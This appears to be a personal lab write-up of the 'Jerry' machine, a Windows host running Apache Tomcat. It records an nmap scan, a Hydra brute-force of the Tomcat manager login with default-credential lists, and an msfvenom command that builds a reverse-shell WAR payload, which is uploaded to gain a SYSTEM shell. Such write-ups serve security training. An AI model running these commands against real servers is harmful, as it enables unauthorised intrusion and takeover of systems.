# About Jerry
Jerry is an easy-difficulty Windows machine that showcases how to exploit Apache Tomcat, leading to an `NT Authority\SYSTEM` shell, thus fully compromising the target. 

## Enumeration
`10.129.123.27`
### Nmap Scan
`nmap -A -T4 -p- 10.129.123.27`
```
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-title: Apache Tomcat/7.0.88
|_http-favicon: Apache Tomcat
|_http-server-header: Apache-Coyote/1.1
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2012|2008|7 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7
Aggressive OS guesses: Microsoft Windows Server 2012 R2 (97%), Microsoft Windows 7 or Windows Server 2008 R2 (91%), Microsoft Windows Server 2012 or Windows Server 2012 R2 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
```

### Apache
![](Images/Pasted%20image%2020250416212630.png)
Nothing stood out in searchsploit results, but the manager login came up in my google searches, but I did find a generic HTTP login page along with a quick google search gave me lists of default users/passwords for apache tomcat.
## Exploit
Next I will have to do some basic html brute forcing at http://$IP:8080/manager/html
First I will make a user and pass file with common credentials or defaults for apache tomcat.
user
```
admin
both
manager
role
role1
root
tomcat
```
pass
```
password
admin
changethis
manager
password
password1
Password1
r00t
role1
root
s3cret
tomcat
toor
```
This is why we should never use default credentials!
`hydra -L user.txt -P pass.txt -s 8080 -f 10.129.123.27 http-get /manager/html`
![](Images/Pasted%20image%2020250416213356.png)
Even with credentials it didn't appear to let me in?
![](Images/Pasted%20image%2020250416213702.png)
Turns out admin:admin was not correct but the webpage did show me the real credentials that were indeed default creds.
![](Images/Pasted%20image%2020250416213933.png)
![](Images/Pasted%20image%2020250416213955.png)
I noticed the file upload as a potential exploitation point and a quick google search confirmed my suspicions as I found a metasploit module for it.
https://www.rapid7.com/db/modules/exploit/multi/http/tomcat_mgr_upload/

### "manual"
Generate Payload
`msfvenom -p java/shell_reverse_tcp LHOST=IP LPORT=4444 -f war -o shell.war`
Upload Shell
![](Images/Pasted%20image%2020250416214630.png)
Start Listener and call upon it by navigating to IP:8080/shell
![](Images/Pasted%20image%2020250416214702.png)
### Metasploit
Configure and run
![](Images/Pasted%20image%2020250416214857.png)

## Flags
![](Images/Pasted%20image%2020250416215349.png)